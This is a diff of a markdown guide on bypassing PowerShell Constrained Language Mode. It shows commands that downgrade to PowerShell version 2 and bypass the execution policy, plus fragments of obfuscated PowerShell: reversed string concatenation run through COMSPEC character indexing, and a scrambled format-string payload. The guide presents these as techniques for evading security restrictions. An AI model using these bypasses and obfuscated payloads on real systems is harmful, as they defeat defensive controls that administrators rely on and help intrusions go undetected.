@@ -13,32 +13,29 @@ First check that CLM is in place by executing the following:
 $ExecutionContext.SessionState.LanguageMode
 ```
 
-If you want to set the Session to CLM from Full for testing then run:
+If you want to set the Session to CLM from Full for testing then run the following however be aware that spawning a new session would spawn in full mode regardless if this is the default on your system.
+I will leave it to the reader to do this.
 
 ```
 $ExecutionContext.SessionState.LanguageMode = "ConstrainedLanguage"
 ```
 
-I will leave it to the reader to make sure that the default is using CLM and not Full mode if testing.
-
-Or if you want to change the PowerShell version then simplay add the arguments as per above.
-
-The most common route is to simply downgrade to version 2 by using the '--version 2' argument.
+Firstly, the most common way to bypass CLM is to simply downgrade to PowerShell version 2 if it is installed. You can do this by appending the '-version 2' argument.
 
 
 ```
-powershell.exe -Version 2
+powershell.exe -version 2
 ```
 
 If you want to bypass the execution policy then append the following:
 
 ```
-powershell.exe -Version 2 -ExecutionPolicy bypass
+powershell.exe -version 2 -ExecutionPolicy bypass
 ```
 
 Although this will likely work if PowerShell version 2 is installed alot of tools may not work to their full potential or simply not fit into your requirements using the legacy version.
 
-There are tools out there to help ofcourse, these are usually execuable files which will touch disk and may not be what you want to do.
+There are tools out there to help ofcourse, these are usually execuable files which will touch disk and may not suit your needs.
 
 The following method can be simply pasted into a PowerShell window and a new PowerShell session is spawned as either the current PowerShell Version, or if needed, you could change the version to any other (2,3,4,5,6,7)
 
@@ -135,7 +132,7 @@ pme'+'t:vne}2{'+' ='+' p'+'me'+'Trr'+'uC'+'}2{'(( ";.( $Env:coMSPeC[4,24,25]-jOI
 ```
 
 Obfuscated String Reorder
-------------------------
+-------------------------
 
 ```
 (("{80}{106}{34}{40}{49}{45}{120}{29}{125}{124}{65}{87}{90}{70}{110}{41}{71}{112}{118}{96}{69}{8}{82}{103}{122}{119}{21}{14}{117}{5}{51}{55}{24}{94}{95}{83}{98}{88}{84}{53}{105}{99}{6}{31}{73}{32}{33}{77}{78}{23}{50}{48}{17}{109}{25}{111}{9}{100}{115}{104}{97}{37}{62}{102}{63}{75}{1}{22}{93}{66}{27}{57}{7}{44}{4}{38}{56}{26}{60}{30}{101}{13}{18}{52}{10}{114}{68}{3}{43}{86}{19}{15}{92}{108}{89}{59}{12}{76}{20}{123}{81}{46}{0}{35}{107}{16}{58}{36}{116}{113}{47}{61}{74}{72}{85}{67}{121}{54}{42}{79}{64}{2}{39}{28}{11}{91}"-f'1 -Nam','l',' -Value ','
